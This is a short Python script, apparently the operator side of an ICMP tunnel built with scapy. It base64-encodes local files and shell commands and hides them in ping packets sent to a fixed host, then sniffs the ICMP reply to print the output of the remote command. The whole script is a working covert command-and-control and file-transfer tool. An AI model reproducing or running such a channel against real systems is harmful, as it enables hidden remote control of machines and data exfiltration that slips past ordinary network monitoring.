from scapy.all import *
import base64

destination = "192.168.18.1"
sniffInterface = "eth0"


while True:

    action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | message | command\n")
	
    if action == "file":
		
        fileName = input("Which file should we send ?\n")
        fileToSend = open(fileName,"rb")
        binaryData = fileToSend.read()
        encoded = (base64.b64encode(binaryData)).decode('ascii')


        # Protocole : type d'envoi (file/message)
        p = sr1(IP(dst=destination)/ICMP()/"file")
        p = sr1(IP(dst=destination)/ICMP()/fileName)
        p = sr1(IP(dst=destination)/ICMP()/encoded)

    elif action == "command":

        command = input("What command should we run ?\n")
        encodedCommand = base64.b64encode(command.encode('utf-8'))

        # Protocole : type d'envoi (file/message)
        p = sr1(IP(dst=destination)/ICMP()/"command")
        p = sr1(IP(dst=destination)/ICMP()/encodedCommand)

        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
        base64Output = icmpReceived[0][3].fields.get("load").decode("utf-8")
        print(base64.b64decode(base64Output))
	

    elif action == "message":
        print("Not implemented yet")
